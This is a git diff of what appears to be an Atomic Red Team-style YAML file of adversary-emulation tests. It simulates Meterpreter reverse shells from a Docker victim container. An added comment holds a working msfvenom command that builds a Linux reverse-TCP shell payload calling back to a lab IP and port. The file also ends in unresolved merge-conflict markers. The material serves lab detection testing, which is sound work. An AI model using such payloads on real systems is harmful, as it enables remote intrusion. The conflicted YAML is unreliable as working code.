@@ -134,7 +134,6 @@ atomic_tests:
       docker rmi eriksoderblom/alpine-apache-php:24.01
 
 - name: "Meterpreter Reverse Shell in Docker"
-  auto_generated_guid: 4d9ce5ea-a34d-45c8-8d8a-8b7fd75d7790
   description: |
     This test simulates an attacker using Metasploit to handle a reverse shell from a Docker container acting as a victim.
     The test automates the process of setting up attacker and victim environments using tmux, runs payloads, and handles responses.
@@ -145,15 +144,51 @@ atomic_tests:
       description: Path to the test source folder
       type: path
       default: PathToAtomicsFolder/T1505.003/src/msf
+    payload:
+      description: Reverse shell payload to use
+      type: path
+      default: /tmp/payloads/shell-x86.elf
   dependency_executor_name: bash
   executor:
     name: "bash"
     command: |
-      sh -c "cd #{test_src} && ./invoke_test.sh"
+      cd #{test_src} 
+      PAYLOAD=#{payload} ./invoke_test.sh
   dependencies:
     - description: "Ensure Docker and Metasploit are installed and configured properly."
     - description: "Ensure tmux is installed on the host."
   cleanup_command: |- 
     rm -r #{test_src}/payloads/.msf4 || :
     rm /tmp/meterpreter_session.log || : 
-    
+# To generate payload, inside msf folder run
+# ./bin/msfvenom -p linux/x86/shell/reverse_tcp  lhost=10.2.0.201 lport=4444 -f elf -o /home/msf/shell-x86.elf
+- name: "Meterpreter Staged Reverse Shell in Docker"
+  description: |
+    This test simulates an attacker using Metasploit to handle a staged reverse shell from a Docker container acting as a victim.
+  supported_platforms:
+    - linux
+  input_arguments:
+    test_src:
+      description: Path to the test source folder
+      type: path
+      default: PathToAtomicsFolder/T1505.003/src/msf
+    payload:
+      description: Reverse shell payload to use
+      type: path
+      default: /tmp/payloads/shell-x86-staged.elf
+  dependency_executor_name: bash
+  executor:
+    name: "bash"
+    command: |
+      cd #{test_src} 
+      PAYLOAD=#{payload} ./invoke_test.sh
+  dependencies:
+    - description: "Ensure Docker and Metasploit are installed and configured properly."
+    - description: "Ensure tmux is installed on the host."
+<<<<<<< Updated upstream
+  cleanup_command: "rm -r #{test_src}/payloads/.msf4 || :"
+=======
+  cleanup_command: |- 
+    rm -r #{test_src}/payloads/.msf4 || :
+    rm /tmp/meterpreter_session.log || : 
+>>>>>>> Stashed changes
